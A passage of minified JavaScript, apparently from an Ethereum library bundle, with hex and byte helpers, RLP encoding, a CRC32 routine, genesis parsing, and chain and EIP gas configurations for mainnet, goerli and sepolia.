        e[e.Number = 0] = "Number", e[e.BigInt = 1] = "BigInt", e[e.Uint8Array = 2] = "Uint8Array", e[e.PrefixedHexString = 3] = "PrefixedHexString"
    })(cn || (cn = {}));
    const oA = e => {
        if (typeof e != "string") throw new Error(`[stripHexPrefix] input must be type 'string', received ${typeof e}`);
        return C0(e) ? e.slice(2) : e
    };

    function W6(e) {
        return !e || e === "0x0" ? "0x0000000000000000" : C0(e) ? `0x${oA(e).padStart(16,"0")}` : `0x${e.padStart(16,"0")}`
    }
    const sA = function(e) {
        if (!Number.isSafeInteger(e) || e < 0) throw new Error(`Received an invalid integer type: ${e}`);
        return `0x${e.toString(16)}`
    };

    function q6(e, t = !0) {
        var n, r;
        const {
            name: i,
            config: o,
            difficulty: s,
            mixHash: a,
            gasLimit: l,
            coinbase: u,
            baseFeePerGas: c
        } = e;
        let {
            extraData: d,
            timestamp: f,
            nonce: h
        } = e;
        const v = Number(f),
            {
                chainId: p
            } = o;
        if (d === "" && (d = "0x"), C0(f) || (f = sA(parseInt(f))), h.length !== 18 && (h = W6(h)), o.eip155Block !== o.eip158Block) throw new Error("EIP155 block number must equal EIP 158 block number since both are part of SpuriousDragon hardfork and the client only supports activating the full hardfork");
        const w = {
                name: i,
                chainId: p,
                networkId: p,
                genesis: {
                    timestamp: f,
                    gasLimit: parseInt(l),
                    difficulty: parseInt(s),
                    nonce: h,
                    extraData: d,
                    mixHash: a,
                    coinbase: u,
                    baseFeePerGas: c
                },
                hardfork: void 0,
                hardforks: [],
                bootstrapNodes: [],
                consensus: o.clique !== void 0 ? {
                    type: "poa",
                    algorithm: "clique",
                    clique: {
                        period: (n = o.clique.period) !== null && n !== void 0 ? n : o.clique.blockperiodseconds,
                        epoch: (r = o.clique.epoch) !== null && r !== void 0 ? r : o.clique.epochlength
                    }
                } : {
                    type: "pow",
                    algorithm: "ethash",
                    ethash: {}
                }
            },
            m = {
                [Se.Homestead]: {
                    name: "homesteadBlock"
                },
                [Se.Dao]: {
                    name: "daoForkBlock"
                },
                [Se.TangerineWhistle]: {
                    name: "eip150Block"
                },
                [Se.SpuriousDragon]: {
                    name: "eip155Block"
                },
                [Se.Byzantium]: {
                    name: "byzantiumBlock"
                },
                [Se.Constantinople]: {
                    name: "constantinopleBlock"
                },
                [Se.Petersburg]: {
                    name: "petersburgBlock"
                },
                [Se.Istanbul]: {
                    name: "istanbulBlock"
                },
                [Se.MuirGlacier]: {
                    name: "muirGlacierBlock"
                },
                [Se.Berlin]: {
                    name: "berlinBlock"
                },
                [Se.London]: {
                    name: "londonBlock"
                },
                [Se.MergeForkIdTransition]: {
                    name: "mergeForkBlock",
                    postMerge: t
                },
                [Se.Shanghai]: {
                    name: "shanghaiTime",
                    postMerge: !0,
                    isTimestamp: !0
                },
                [Se.ShardingForkDev]: {
                    name: "shardingForkTime",
                    postMerge: !0,
                    isTimestamp: !0
                }
            },
            g = Object.keys(m).reduce((E, k) => (E[m[k].name] = k, E), {}),
            y = Object.keys(o).filter(E => g[E] !== void 0 && o[E] !== void 0 && o[E] !== null);
        if (w.hardforks = y.map(E => ({
                name: g[E],
                block: m[g[E]].isTimestamp === !0 || typeof o[E] != "number" ? null : o[E],
                timestamp: m[g[E]].isTimestamp === !0 && typeof o[E] == "number" ? o[E] : void 0
            })).filter(E => E.block !== null || E.timestamp !== void 0), w.hardforks.sort((E, k) => {
                var I, _;
                return ((I = E.block) !== null && I !== void 0 ? I : 1 / 0) - ((_ = k.block) !== null && _ !== void 0 ? _ : 1 / 0)
            }), w.hardforks.sort((E, k) => {
                var I, _;
                return ((I = E.timestamp) !== null && I !== void 0 ? I : v) - ((_ = k.timestamp) !== null && _ !== void 0 ? _ : v)
            }), o.terminalTotalDifficulty !== void 0) {
            const E = {
                    name: Se.Merge,
                    ttd: o.terminalTotalDifficulty,
                    block: null
                },
                k = w.hardforks.findIndex(I => {
                    var _;
                    return ((_ = m[I.name]) === null || _ === void 0 ? void 0 : _.postMerge) === !0
                });
            k !== -1 ? w.hardforks.splice(k, 0, E) : w.hardforks.push(E)
        }
        const x = w.hardforks.length > 0 ? w.hardforks.slice(-1)[0] : void 0;
        return w.hardfork = x == null ? void 0 : x.name, w.hardforks.unshift({
            name: Se.Chainstart,
            block: 0
        }), w
    }

    function Q6(e, t, n) {
        try {
            if (["config", "difficulty", "gasLimit", "alloc"].some(r => !(r in e))) throw new Error("Invalid format, expected geth genesis fields missing");
            return t !== void 0 && (e.name = t), q6(e, n)
        } catch (r) {
            throw new Error(`Error parsing parameters file: ${r.message}`)
        }
    }

    function aA(e) {
        let t = e;
        if (typeof t != "string") throw new Error(`[padToEven] value must be type 'string', received ${typeof t}`);
        return t.length % 2 && (t = `0${t}`), t
    }
    const K6 = function(e) {
            const t = sA(e);
            return ke(`0x${aA(t.slice(2))}`)
        },
        Re = function(e) {
            var t;
            if (e == null) return new Uint8Array;
            if (e instanceof Uint8Array) return e;
            if (((t = e == null ? void 0 : e.constructor) === null || t === void 0 ? void 0 : t.name) === "Uint8Array" || Array.isArray(e)) return Uint8Array.from(e);
            if (typeof e == "string") {
                if (!pE(e)) throw new Error(`Cannot convert string to Uint8Array. only supports 0x-prefixed hex strings and this string was given: ${e}`);
                return ke(aA(oA(e)))
            }
            if (typeof e == "number") return Re(Ze(e));
            if (typeof e == "bigint") {
                if (e < BigInt(0)) throw new Error(`Cannot convert negative bigint to Uint8Array. Given: ${e}`);
                let n = e.toString(16);
                return n.length % 2 && (n = `0${n}`), Re(`0x${n}`)
            }
            if (e.toArray) return Uint8Array.from(e.toArray());
            throw new Error("invalid type")
        };

    function Ae(e) {
        const t = ue(e);
        return BigInt(t === "0x" ? 0 : t)
    }

    function Z6(e) {
        return Re(`0x${e.toString(16)}`)
    }
    const lA = function(e) {
            return new Uint8Array(e).fill(0)
        },
        Y6 = function(e, t, n) {
            const r = lA(t);
            return e.length < t ? (r.set(e, t - e.length), r) : e.subarray(-t)
        };

    function Y0(e) {
        if (!vi(e)) {
            const t = `This method only supports Uint8Array but input was: ${e}`;
            throw new Error(t)
        }
    }
    const $y = function(e, t) {
        return Y0(e), Y6(e, t)
    };

    function J6(e) {
        let t = e[0];
        for (; e.length > 0 && t.toString() === "0";) e = e.slice(1), t = e[0];
        return e
    }
    const Zu = function(e) {
            return Y0(e), J6(e)
        },
        Ne = e => `0x${e.toString(16)}`;

    function he(e) {
        return Zu(Z6(e))
    }

    function X6(e, t) {
        return e === BigInt(0) || e === BigInt(1) ? e : t === void 0 ? e - BigInt(27) : e - (t * BigInt(2) + BigInt(35))
    }

    function e8(e) {
        return e === BigInt(0) || e === BigInt(1)
    }
    const J0 = function(e, t, n, r, i) {
        const o = X6(t, i);
        if (!e8(o)) throw new Error("Invalid signature v value");
        return new Ir.Signature(Ae(n), Ae(r)).addRecoveryBit(Number(o)).recoverPublicKey(e).toRawBytes(!1).slice(1)
    };

    function _o(e, t) {
        if (e === null) return null;
        if (e === void 0) return;
        if (typeof e == "string" && !pE(e)) throw new Error(`A string must be provided with a 0x-prefix, given: ${e}`);
        if (typeof e == "number" && !Number.isSafeInteger(e)) throw new Error("The provided number is greater than MAX_SAFE_INTEGER (please use an alternative input type)");
        const n = Re(e);
        switch (t) {
            case cn.Uint8Array:
                return n;
            case cn.BigInt:
                return Ae(n);
            case cn.Number:
                {
                    const r = Ae(n);
                    if (r > BigInt(Number.MAX_SAFE_INTEGER)) throw new Error("The provided number is greater than MAX_SAFE_INTEGER (please use an alternative output type)");
                    return Number(r)
                }
            case cn.PrefixedHexString:
                return ue(n);
            default:
                throw new Error("unknown outputType")
        }
    }
    var pr = {};
    Object.defineProperty(pr, "__esModule", {
        value: !0
    });
    var zt = pr.RLP = pr.utils = pr.decode = pr.encode = void 0;

    function X0(e) {
        if (Array.isArray(e)) {
            const n = [];
            let r = 0;
            for (let i = 0; i < e.length; i++) {
                const o = X0(e[i]);
                n.push(o), r += o.length
            }
            return Dp(zy(r, 192), ...n)
        }
        const t = pA(e);
        return t.length === 1 && t[0] < 128 ? t : Dp(zy(t.length, 128), t)
    }
    pr.encode = X0;

    function So(e, t, n) {
        if (n > e.length) throw new Error("invalid RLP (safeSlice): end slice of Uint8Array out-of-bounds");
        return e.slice(t, n)
    }

    function Uy(e) {
        if (e[0] === 0) throw new Error("invalid RLP: extra zeros");
        return dA(uA(e))
    }

    function zy(e, t) {
        if (e < 56) return Uint8Array.from([e + t]);
        const n = jp(e),
            r = n.length / 2,
            i = jp(t + 55 + r);
        return Uint8Array.from(Yu(i + n))
    }

    function cA(e, t = !1) {
        if (typeof e > "u" || e === null || e.length === 0) return Uint8Array.from([]);
        const n = pA(e),
            r = Fp(n);
        if (t) return r;
        if (r.remainder.length !== 0) throw new Error("invalid RLP: remainder must be zero");
        return r.data
    }
    pr.decode = cA;

    function Fp(e) {
        let t, n, r, i, o;
        const s = [],
            a = e[0];
        if (a <= 127) return {
            data: e.slice(0, 1),
            remainder: e.slice(1)
        };
        if (a <= 183) {
            if (t = a - 127, a === 128 ? r = Uint8Array.from([]) : r = So(e, 1, t), t === 2 && r[0] < 128) throw new Error("invalid RLP encoding: invalid prefix, single byte < 0x80 are not prefixed");
            return {
                data: r,
                remainder: e.slice(t)
            }
        } else if (a <= 191) {
            if (n = a - 182, e.length - 1 < n) throw new Error("invalid RLP: not enough bytes for string length");
            if (t = Uy(So(e, 1, n)), t <= 55) throw new Error("invalid RLP: expected string length to be greater than 55");
            return r = So(e, n, t + n), {
                data: r,
                remainder: e.slice(t + n)
            }
        } else if (a <= 247) {
            for (t = a - 191, i = So(e, 1, t); i.length;) o = Fp(i), s.push(o.data), i = o.remainder;
            return {
                data: s,
                remainder: e.slice(t)
            }
        } else {
            if (n = a - 246, t = Uy(So(e, 1, n)), t < 56) throw new Error("invalid RLP: encoded list too short");
            const l = n + t;
            if (l > e.length) throw new Error("invalid RLP: total length is larger than the data");
            for (i = So(e, n, l); i.length;) o = Fp(i), s.push(o.data), i = o.remainder;
            return {
                data: s,
                remainder: e.slice(l)
            }
        }
    }
    const t8 = Array.from({
        length: 256
    }, (e, t) => t.toString(16).padStart(2, "0"));

    function uA(e) {
        let t = "";
        for (let n = 0; n < e.length; n++) t += t8[e[n]];
        return t
    }

    function dA(e) {
        const t = Number.parseInt(e, 16);
        if (Number.isNaN(t)) throw new Error("Invalid byte sequence");
        return t
    }

    function Yu(e) {
        if (typeof e != "string") throw new TypeError("hexToBytes: expected string, got " + typeof e);
        if (e.length % 2) throw new Error("hexToBytes: received invalid unpadded hex");
        const t = new Uint8Array(e.length / 2);
        for (let n = 0; n < t.length; n++) {
            const r = n * 2;
            t[n] = dA(e.slice(r, r + 2))
        }
        return t
    }

    function Dp(...e) {
        if (e.length === 1) return e[0];
        const t = e.reduce((r, i) => r + i.length, 0),
            n = new Uint8Array(t);
        for (let r = 0, i = 0; r < e.length; r++) {
            const o = e[r];
            n.set(o, i), i += o.length
        }
        return n
    }

    function fA(e) {
        return new TextEncoder().encode(e)
    }

    function jp(e) {
        if (e < 0) throw new Error("Invalid integer as argument, must be unsigned!");
        const t = e.toString(16);
        return t.length % 2 ? `0${t}` : t
    }

    function n8(e) {
        return e.length % 2 ? `0${e}` : e
    }

    function hA(e) {
        return e.length >= 2 && e[0] === "0" && e[1] === "x"
    }

    function r8(e) {
        return typeof e != "string" ? e : hA(e) ? e.slice(2) : e
    }

    function pA(e) {
        if (e instanceof Uint8Array) return e;
        if (typeof e == "string") return hA(e) ? Yu(n8(r8(e))) : fA(e);
        if (typeof e == "number" || typeof e == "bigint") return e ? Yu(jp(e)) : Uint8Array.from([]);
        if (e == null) return Uint8Array.from([]);
        throw new Error("toBytes: received unsupported type " + typeof e)
    }
    pr.utils = {
        bytesToHex: uA,
        concatBytes: Dp,
        hexToBytes: Yu,
        utf8ToBytes: fA
    };
    zt = pr.RLP = {
        encode: X0,
        decode: cA
    };
    var mA = {}; /*! crc32.js (C) 2014-present SheetJS -- http://sheetjs.com */
    (function(e) {
        (function(t) {
            t(typeof DO_NOT_EXPORT_CRC > "u" ? e : {})
        })(function(t) {
            t.version = "1.2.2";

            function n() {
                for (var _ = 0, L = new Array(256), C = 0; C != 256; ++C) _ = C, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, _ = _ & 1 ? -306674912 ^ _ >>> 1 : _ >>> 1, L[C] = _;
                return typeof Int32Array < "u" ? new Int32Array(L) : L
            }
            var r = n();

            function i(_) {
                var L = 0,
                    C = 0,
                    M = 0,
                    F = typeof Int32Array < "u" ? new Int32Array(4096) : new Array(4096);
                for (M = 0; M != 256; ++M) F[M] = _[M];
                for (M = 0; M != 256; ++M)
                    for (C = _[M], L = 256 + M; L < 4096; L += 256) C = F[L] = C >>> 8 ^ _[C & 255];
                var U = [];
                for (M = 1; M != 16; ++M) U[M - 1] = typeof Int32Array < "u" ? F.subarray(M * 256, M * 256 + 256) : F.slice(M * 256, M * 256 + 256);
                return U
            }
            var o = i(r),
                s = o[0],
                a = o[1],
                l = o[2],
                u = o[3],
                c = o[4],
                d = o[5],
                f = o[6],
                h = o[7],
                v = o[8],
                p = o[9],
                w = o[10],
                m = o[11],
                g = o[12],
                y = o[13],
                x = o[14];

            function E(_, L) {
                for (var C = L ^ -1, M = 0, F = _.length; M < F;) C = C >>> 8 ^ r[(C ^ _.charCodeAt(M++)) & 255];
                return ~C
            }

            function k(_, L) {
                for (var C = L ^ -1, M = _.length - 15, F = 0; F < M;) C = x[_[F++] ^ C & 255] ^ y[_[F++] ^ C >> 8 & 255] ^ g[_[F++] ^ C >> 16 & 255] ^ m[_[F++] ^ C >>> 24] ^ w[_[F++]] ^ p[_[F++]] ^ v[_[F++]] ^ h[_[F++]] ^ f[_[F++]] ^ d[_[F++]] ^ c[_[F++]] ^ u[_[F++]] ^ l[_[F++]] ^ a[_[F++]] ^ s[_[F++]] ^ r[_[F++]];
                for (M += 15; F < M;) C = C >>> 8 ^ r[(C ^ _[F++]) & 255];
                return ~C
            }

            function I(_, L) {
                for (var C = L ^ -1, M = 0, F = _.length, U = 0, Q = 0; M < F;) U = _.charCodeAt(M++), U < 128 ? C = C >>> 8 ^ r[(C ^ U) & 255] : U < 2048 ? (C = C >>> 8 ^ r[(C ^ (192 | U >> 6 & 31)) & 255], C = C >>> 8 ^ r[(C ^ (128 | U & 63)) & 255]) : U >= 55296 && U < 57344 ? (U = (U & 1023) + 64, Q = _.charCodeAt(M++) & 1023, C = C >>> 8 ^ r[(C ^ (240 | U >> 8 & 7)) & 255], C = C >>> 8 ^ r[(C ^ (128 | U >> 2 & 63)) & 255], C = C >>> 8 ^ r[(C ^ (128 | Q >> 6 & 15 | (U & 3) << 4)) & 255], C = C >>> 8 ^ r[(C ^ (128 | Q & 63)) & 255]) : (C = C >>> 8 ^ r[(C ^ (224 | U >> 12 & 15)) & 255], C = C >>> 8 ^ r[(C ^ (128 | U >> 6 & 63)) & 255], C = C >>> 8 ^ r[(C ^ (128 | U & 63)) & 255]);
                return ~C
            }
            t.table = r, t.bstr = E, t.buf = k, t.str = I
        })
    })(mA);
    const i8 = dd(mA),
        o8 = {
            name: "goerli",
            chainId: 5,
            networkId: 5,
            defaultHardfork: "merge",
            consensus: {
                type: "poa",
                algorithm: "clique",
                clique: {
                    period: 15,
                    epoch: 3e4
                }
            },
            comment: "Cross-client PoA test network",
            url: "https://github.com/goerli/testnet",
            genesis: {
                timestamp: "0x5c51a607",
                gasLimit: 10485760,
                difficulty: 1,
                nonce: "0x0000000000000000",
                extraData: "0x22466c6578692069732061207468696e6722202d204166726900000000000000e0a2bd4258d2768837baa26a28fe71dc079f84c70000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
            },
            hardforks: [{
                name: "chainstart",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "homestead",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "tangerineWhistle",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "spuriousDragon",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "byzantium",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "constantinople",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "petersburg",
                block: 0,
                forkHash: "0xa3f5ab08"
            }, {
                name: "istanbul",
                block: 1561651,
                forkHash: "0xc25efa5c"
            }, {
                name: "berlin",
                block: 4460644,
                forkHash: "0x757a1c47"
            }, {
                name: "london",
                block: 5062605,
                forkHash: "0xb8c6299d"
            }, {
                "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://goerli.etherscan.io/block/7382818",
                name: "merge",
                ttd: "10790000",
                block: 7382819,
                forkHash: "0xb8c6299d"
            }, {
                name: "mergeForkIdTransition",
                block: null,
                forkHash: null
            }, {
                name: "shanghai",
                block: null,
                forkHash: null
            }],
            bootstrapNodes: [],
            dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.goerli.ethdisco.net"]
        },
        s8 = {
            name: "mainnet",
            chainId: 1,
            networkId: 1,
            defaultHardfork: "merge",
            consensus: {
                type: "pow",
                algorithm: "ethash",
                ethash: {}
            },
            comment: "The Ethereum main chain",
            url: "https://ethstats.net/",
            genesis: {
                gasLimit: 5e3,
                difficulty: 17179869184,
                nonce: "0x0000000000000042",
                extraData: "0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa"
            },
            hardforks: [{
                name: "chainstart",
                block: 0,
                forkHash: "0xfc64ec04"
            }, {
                name: "homestead",
                block: 115e4,
                forkHash: "0x97c2c34c"
            }, {
                name: "dao",
                block: 192e4,
                forkHash: "0x91d1f948"
            }, {
                name: "tangerineWhistle",
                block: 2463e3,
                forkHash: "0x7a64da13"
            }, {
                name: "spuriousDragon",
                block: 2675e3,
                forkHash: "0x3edd5b10"
            }, {
                name: "byzantium",
                block: 437e4,
                forkHash: "0xa00bc324"
            }, {
                name: "constantinople",
                block: 728e4,
                forkHash: "0x668db0af"
            }, {
                name: "petersburg",
                block: 728e4,
                forkHash: "0x668db0af"
            }, {
                name: "istanbul",
                block: 9069e3,
                forkHash: "0x879d6e30"
            }, {
                name: "muirGlacier",
                block: 92e5,
                forkHash: "0xe029e991"
            }, {
                name: "berlin",
                block: 12244e3,
                forkHash: "0x0eb440f6"
            }, {
                name: "london",
                block: 12965e3,
                forkHash: "0xb715077d"
            }, {
                name: "arrowGlacier",
                block: 13773e3,
                forkHash: "0x20c327fc"
            }, {
                name: "grayGlacier",
                block: 1505e4,
                forkHash: "0xf0afd0e3"
            }, {
                "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://etherscan.io/block/15537393",
                name: "merge",
                ttd: "58750000000000000000000",
                block: 15537394,
                forkHash: "0xf0afd0e3"
            }, {
                name: "mergeForkIdTransition",
                block: null,
                forkHash: null
            }, {
                name: "shanghai",
                block: null,
                forkHash: null
            }],
            bootstrapNodes: [],
            dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.mainnet.ethdisco.net"]
        },
        a8 = {
            name: "sepolia",
            chainId: 11155111,
            networkId: 11155111,
            defaultHardfork: "merge",
            consensus: {
                type: "pow",
                algorithm: "ethash",
                ethash: {}
            },
            comment: "PoW test network to replace Ropsten",
            url: "https://github.com/ethereum/go-ethereum/pull/23730",
            genesis: {
                timestamp: "0x6159af19",
                gasLimit: 3e7,
                difficulty: 131072,
                nonce: "0x0000000000000000",
                extraData: "0x5365706f6c69612c20417468656e732c204174746963612c2047726565636521"
            },
            hardforks: [{
                name: "chainstart",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "homestead",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "tangerineWhistle",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "spuriousDragon",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "byzantium",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "constantinople",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "petersburg",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "istanbul",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "muirGlacier",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "berlin",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                name: "london",
                block: 0,
                forkHash: "0xfe3366e7"
            }, {
                "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://sepolia.etherscan.io/block/1450408",
                name: "merge",
                ttd: "17000000000000000",
                block: 1450409,
                forkHash: "0xfe3366e7"
            }, {
                name: "mergeForkIdTransition",
                block: 1735371,
                forkHash: "0xb96cbd13"
            }, {
                name: "shanghai",
                block: null,
                timestamp: "1677557088",
                forkHash: "0xf7f9bc08"
            }],
            bootstrapNodes: [],
            dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.sepolia.ethdisco.net"]
        },
        l8 = {
            name: "EIP-1153",
            number: 1153,
            comment: "Transient Storage",
            url: "https://eips.ethereum.org/EIPS/eip-1153",
            status: "Review",
            minimumHardfork: "chainstart",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {
                tstore: {
                    v: 100,
                    d: "Base fee of the TSTORE opcode"
                },
                tload: {
                    v: 100,
                    d: "Base fee of the TLOAD opcode"
                }
            },
            vm: {},
            pow: {}
        },
        c8 = {
            name: "EIP-1559",
            number: 1559,
            comment: "Fee market change for ETH 1.0 chain",
            url: "https://eips.ethereum.org/EIPS/eip-1559",
            status: "Final",
            minimumHardfork: "berlin",
            requiredEIPs: [2930],
            gasConfig: {
                baseFeeMaxChangeDenominator: {
                    v: 8,
                    d: "Maximum base fee change denominator"
                },
                elasticityMultiplier: {
                    v: 2,
                    d: "Maximum block gas target elasticity"
                },
                initialBaseFee: {
                    v: 1e9,
                    d: "Initial base fee on first EIP1559 block"
                }
            },
            gasPrices: {},
            vm: {},
            pow: {}
        },
        u8 = {
            name: "EIP-2315",
            number: 2315,
            comment: "Simple subroutines for the EVM",
            url: "https://eips.ethereum.org/EIPS/eip-2315",
            status: "Draft",
            minimumHardfork: "istanbul",
            gasConfig: {},
            gasPrices: {
                beginsub: {
                    v: 2,
                    d: "Base fee of the BEGINSUB opcode"
                },
                returnsub: {
                    v: 5,
                    d: "Base fee of the RETURNSUB opcode"
                },
                jumpsub: {
                    v: 10,
                    d: "Base fee of the JUMPSUB opcode"
                }
            },
            vm: {},
            pow: {}
        },
        d8 = {
            name: "EIP-2537",
            number: 2537,
            comment: "BLS12-381 precompiles",
            url: "https://eips.ethereum.org/EIPS/eip-2537",
            status: "Draft",
            minimumHardfork: "chainstart",
            gasConfig: {},
            gasPrices: {
                Bls12381G1AddGas: {
                    v: 600,
                    d: "Gas cost of a single BLS12-381 G1 addition precompile-call"
                },
                Bls12381G1MulGas: {
                    v: 12e3,
                    d: "Gas cost of a single BLS12-381 G1 multiplication precompile-call"
                },
                Bls12381G2AddGas: {
                    v: 4500,
                    d: "Gas cost of a single BLS12-381 G2 addition precompile-call"
                },
                Bls12381G2MulGas: {
                    v: 55e3,
                    d: "Gas cost of a single BLS12-381 G2 multiplication precompile-call"
                },
                Bls12381PairingBaseGas: {
                    v: 115e3,
                    d: "Base gas cost of BLS12-381 pairing check"
                },
                Bls12381PairingPerPairGas: {
                    v: 23e3,
                    d: "Per-pair gas cost of BLS12-381 pairing check"
                },
                Bls12381MapG1Gas: {
                    v: 5500,
                    d: "Gas cost of BLS12-381 map field element to G1"
                },
                Bls12381MapG2Gas: {
                    v: 11e4,
                    d: "Gas cost of BLS12-381 map field element to G2"
                },
                Bls12381MultiExpGasDiscount: {
                    v: [
                        [1, 1200],
                        [2, 888],
                        [3, 764],
                        [4, 641],
                        [5, 594],
                        [6, 547],
                        [7, 500],
                        [8, 453],
                        [9, 438],
                        [10, 423],
                        [11, 408],
                        [12, 394],
                        [13, 379],
                        [14, 364],
                        [15, 349],
                        [16, 334],
                        [17, 330],
                        [18, 326],
                        [19, 322],
                        [20, 318],
                        [21, 314],
                        [22, 310],
                        [23, 306],
                        [24, 302],
                        [25, 298],
                        [26, 294],
                        [27, 289],
                        [28, 285],
                        [29, 281],
                        [30, 277],
                        [31, 273],
                        [32, 269],
                        [33, 268],
                        [34, 266],
                        [35, 265],
                        [36, 263],
                        [37, 262],
                        [38, 260],
                        [39, 259],
                        [40, 257],
                        [41, 256],
                        [42, 254],
                        [43, 253],
                        [44, 251],
                        [45, 250],
                        [46, 248],
                        [47, 247],
                        [48, 245],
                        [49, 244],
                        [50, 242],
                        [51, 241],
                        [52, 239],
                        [53, 238],
                        [54, 236],
                        [55, 235],
                        [56, 233],
                        [57, 232],
                        [58, 231],
                        [59, 229],
                        [60, 228],
                        [61, 226],
                        [62, 225],
                        [63, 223],
                        [64, 222],
                        [65, 221],
                        [66, 220],
                        [67, 219],
                        [68, 219],
                        [69, 218],
                        [70, 217],
                        [71, 216],
                        [72, 216],
                        [73, 215],
                        [74, 214],
                        [75, 213],
                        [76, 213],
                        [77, 212],
                        [78, 211],
                        [79, 211],
                        [80, 210],
                        [81, 209],
                        [82, 208],
                        [83, 208],
                        [84, 207],
                        [85, 206],
                        [86, 205],
                        [87, 205],
                        [88, 204],
                        [89, 203],
                        [90, 202],
                        [91, 202],
                        [92, 201],
                        [93, 200],
                        [94, 199],
                        [95, 199],
                        [96, 198],
                        [97, 197],
                        [98, 196],
                        [99, 196],
                        [100, 195],
                        [101, 194],
                        [102, 193],
                        [103, 193],
                        [104, 192],
                        [105, 191],
                        [106, 191],
                        [107, 190],
                        [108, 189],
                        [109, 188],
                        [110, 188],
                        [111, 187],
                        [112, 186],
                        [113, 185],
                        [114, 185],
                        [115, 184],
                        [116, 183],
                        [117, 182],
                        [118, 182],
                        [119, 181],
                        [120, 180],
                        [121, 179],
                        [122, 179],
                        [123, 178],
                        [124, 177],
                        [125, 176],
                        [126, 176],
                        [127, 175],
                        [128, 174]
                    ],
                    d: "Discount gas costs of calls to the MultiExp precompiles with `k` (point, scalar) pair"
                }
            },
            vm: {},
            pow: {}
        },
        f8 = {
            name: "EIP-2565",
            number: 2565,
            comment: "ModExp gas cost",
            url: "https://eips.ethereum.org/EIPS/eip-2565",
            status: "Final",
            minimumHardfork: "byzantium",
            gasConfig: {},
            gasPrices: {
                modexpGquaddivisor: {
                    v: 3,
                    d: "Gquaddivisor from modexp precompile for gas calculation"
                }
            },
            vm: {},
            pow: {}
        },
        h8 = {
            name: "EIP-2718",
            comment: "Typed Transaction Envelope",
            url: "https://eips.ethereum.org/EIPS/eip-2718",
            status: "Final",
            minimumHardfork: "chainstart",
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        p8 = {
            name: "EIP-2929",
            comment: "Gas cost increases for state access opcodes",
            url: "https://eips.ethereum.org/EIPS/eip-2929",
            status: "Final",
            minimumHardfork: "chainstart",
            gasConfig: {},
            gasPrices: {
                coldsload: {
                    v: 2100,
                    d: "Gas cost of the first read of storage from a given location (per transaction)"
                },
                coldaccountaccess: {
                    v: 2600,
                    d: "Gas cost of the first read of a given address (per transaction)"
                },
                warmstorageread: {
                    v: 100,
                    d: "Gas cost of reading storage locations which have already loaded 'cold'"
                },
                sstoreCleanGasEIP2200: {
                    v: 2900,
                    d: "Once per SSTORE operation from clean non-zero to something else"
                },
                sstoreNoopGasEIP2200: {
                    v: 100,
                    d: "Once per SSTORE operation if the value doesn't change"
                },
                sstoreDirtyGasEIP2200: {
                    v: 100,
                    d: "Once per SSTORE operation if a dirty value is changed"
                },
                sstoreInitRefundEIP2200: {
                    v: 19900,
                    d: "Once per SSTORE operation for resetting to the original zero value"
                },
                sstoreCleanRefundEIP2200: {
                    v: 4900,
                    d: "Once per SSTORE operation for resetting to the original non-zero value"
                },
                call: {
                    v: 0,
                    d: "Base fee of the CALL opcode"
                },
                callcode: {
                    v: 0,
                    d: "Base fee of the CALLCODE opcode"
                },
                delegatecall: {
                    v: 0,
                    d: "Base fee of the DELEGATECALL opcode"
                },
                staticcall: {
                    v: 0,
                    d: "Base fee of the STATICCALL opcode"
                },
                balance: {
                    v: 0,
                    d: "Base fee of the BALANCE opcode"
                },
                extcodesize: {
                    v: 0,
                    d: "Base fee of the EXTCODESIZE opcode"
                },
                extcodecopy: {
                    v: 0,
                    d: "Base fee of the EXTCODECOPY opcode"
                },
                extcodehash: {
                    v: 0,
                    d: "Base fee of the EXTCODEHASH opcode"
                },
                sload: {
                    v: 0,
                    d: "Base fee of the SLOAD opcode"
                },
                sstore: {
                    v: 0,
                    d: "Base fee of the SSTORE opcode"
                }
            },
            vm: {},
            pow: {}
        },
        m8 = {
            name: "EIP-2930",
            comment: "Optional access lists",
            url: "https://eips.ethereum.org/EIPS/eip-2930",
            status: "Final",
            minimumHardfork: "istanbul",
            requiredEIPs: [2718, 2929],
            gasConfig: {},
            gasPrices: {
                accessListStorageKeyCost: {
                    v: 1900,
                    d: "Gas cost per storage key in an Access List transaction"
                },
                accessListAddressCost: {
